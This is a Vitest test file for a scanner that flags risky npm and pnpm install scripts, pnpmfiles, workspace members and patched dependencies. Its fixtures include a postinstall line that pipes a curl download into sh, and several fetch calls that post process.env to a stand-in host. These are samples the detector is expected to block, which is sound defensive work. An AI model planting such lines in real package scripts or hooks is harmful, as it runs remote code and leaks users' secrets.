import { describe, expect, it } from "vitest";
import {
  pnpmfileFindings,
  projectScriptFindings,
  workspaceMembers,
} from "./project.ts";

const project = (files: Record<string, string>, links: string[] = []) => ({
  read: (path: string) => files[path.replace(/^\/p\//, "")],
  kind: (path: string) => {
    const rel = path.replace(/^\/p\//, "");
    if (links.includes(rel)) return { kind: "symlink" as const, size: 0 };
    const text = files[rel];
    return text === undefined
      ? undefined
      : { kind: "file" as const, size: text.length };
  },
});
const manifest = (scripts: Record<string, string>) =>
  JSON.stringify({ name: "app", scripts });
const severities = (files: Record<string, string>, links?: string[]) =>
  projectScriptFindings("/p", project(files, links)).map(
    (f) => `${f.severity}:${f.file}`,
  );

describe("projectScriptFindings", () => {
  it("blocks the fake test assignment: a postinstall that pipes a download into a shell", () => {
    expect(
      severities({
        "package.json": manifest({
          postinstall: "curl -s http://x.invalid/i | sh",
        }),
      }),
    ).toEqual(["block:package.json"]);
  });

  it("follows the files the scripts run", () => {
    const files = {
      "package.json": manifest({ prepare: "node scripts/setup.js" }),
      "scripts/setup.js":
        'fetch("http://localhost:9", { body: JSON.stringify(process.env) });',
    };
    expect(severities(files)).toEqual(["block:package.json"]);
  });

  it("notes known tools and stays quiet without install scripts", () => {
    expect(
      severities({ "package.json": manifest({ prepare: "husky" }) }),
    ).toEqual(["info:package.json"]);
    expect(
      severities({ "package.json": manifest({ test: "vitest" }) }),
    ).toEqual([]);
  });

  it("warns on binding.gyp (an implicit node-gyp rebuild) and on scripts it cannot read", () => {
    expect(
      severities({ "package.json": manifest({}), "binding.gyp": "{}" }),
    ).toEqual(["warn:binding.gyp"]);
    expect(
      severities({ "package.json": manifest({ postinstall: "node run.js" }) }, [
        "run.js",
      ]),
    ).toEqual(["warn:package.json"]);
  });

  it("finds nothing without a package.json", () => {
    expect(severities({})).toEqual([]);
  });
});

describe("workspace members (M6 review)", () => {
  it("reads the members npm and pnpm lockfiles install", () => {
    expect(
      workspaceMembers(
        JSON.stringify({
          lockfileVersion: 3,
          packages: {
            "": { name: "repo" },
            "packages/a": { name: "a", version: "1.0.0" },
            "node_modules/a": { resolved: "packages/a", link: true },
            "node_modules/zod": { version: "3.0.0", resolved: "https://x" },
          },
        }),
      ),
    ).toEqual(["packages/a"]);
    expect(
      workspaceMembers(
        "lockfileVersion: '9.0'\n\nimporters:\n\n  .:\n    dependencies: {}\n\n  packages/b:\n    dependencies: {}\n",
      ),
    ).toEqual(["packages/b"]);
  });

  it("checks each member's install scripts, and warns on one outside the project", () => {
    const files = {
      "package.json": manifest({}),
      "packages/a/package.json": manifest({ postinstall: "node setup.js" }),
      "packages/a/setup.js":
        'fetch("http://localhost:9", { body: JSON.stringify(process.env) });',
    };
    const found = (members: string[]) =>
      projectScriptFindings("/p", project(files), { members }).map(
        (f) => `${f.severity}:${f.file}`,
      );
    expect(found(["packages/a"])).toEqual(["block:packages/a/package.json"]);
    expect(found(["../elsewhere"])).toEqual(["warn:package.json"]);
  });

  it("checks pnpm:devPreinstall only for pnpm", () => {
    const files = {
      "package.json": manifest({ "pnpm:devPreinstall": "node prep.js" }),
      "prep.js": "console.log(1);",
    };
    const severity = (pnpm: boolean) =>
      projectScriptFindings("/p", project(files), { pnpm }).map(
        (f) => f.severity,
      );
    expect(severity(true)).toEqual(["warn"]);
    expect(severity(false)).toEqual([]);
  });
});

describe("pnpmfileFindings (D39)", () => {
  const found = (files: Record<string, string>) =>
    pnpmfileFindings("/p", project(files)).map(
      (f) => `${f.severity}:${f.file}:${f.message.replace(/:.*/, "")}`,
    );

  it("warns that pnpm runs the pnpmfile on every install, and blocks one that sends secrets", () => {
    expect(
      found({ ".pnpmfile.cjs": "module.exports = { hooks: {} };" }),
    ).toEqual(["warn:.pnpmfile.cjs:pnpm runs .pnpmfile.cjs on every install"]);
    expect(
      found({
        ".pnpmfile.cjs":
          'fetch("http://localhost:9", { body: JSON.stringify(process.env) });',
      })[0],
    ).toMatch(/^block:/);
  });

  it("follows pnpmfile: in pnpm-workspace.yaml and notes config dependencies", () => {
    const out = found({
      "pnpm-workspace.yaml":
        "pnpmfile: hooks/pnpm.cjs\nconfigDependencies:\n  my-config: 1.0.0+sha512-x\n",
      "hooks/pnpm.cjs": "module.exports = {};",
    });
    expect(out).toEqual([
      "warn:hooks/pnpm.cjs:pnpm runs hooks/pnpm.cjs on every install",
      "warn:pnpm-workspace.yaml:pnpm installs config dependencies first and loads their pnpmfiles",
    ]);
  });

  it("reads a list of pnpmfiles and warns on patched dependencies (M6 review)", () => {
    expect(
      found({
        "pnpm-workspace.yaml":
          "pnpmfile:\n  - hooks/a.cjs\n  - hooks/b.cjs\npatchedDependencies:\n  lodash: patches/lodash.patch\n",
        "hooks/a.cjs": "module.exports = {};",
        "hooks/b.cjs": "module.exports = {};",
      }),
    ).toEqual([
      "warn:hooks/a.cjs:pnpm runs hooks/a.cjs on every install",
      "warn:hooks/b.cjs:pnpm runs hooks/b.cjs on every install",
      "warn:pnpm-workspace.yaml:pnpm patches dependencies after download, past what croak checked",
    ]);
    expect(
      found({
        "package.json": JSON.stringify({
          pnpm: { patchedDependencies: { "x@1.0.0": "p.patch" } },
        }),
      }),
    ).toEqual([
      "warn:package.json:pnpm patches dependencies after download, past what croak checked",
    ]);
  });

  it("finds nothing in a project without either", () => {
    expect(found({ "package.json": "{}" })).toEqual([]);
  });
});
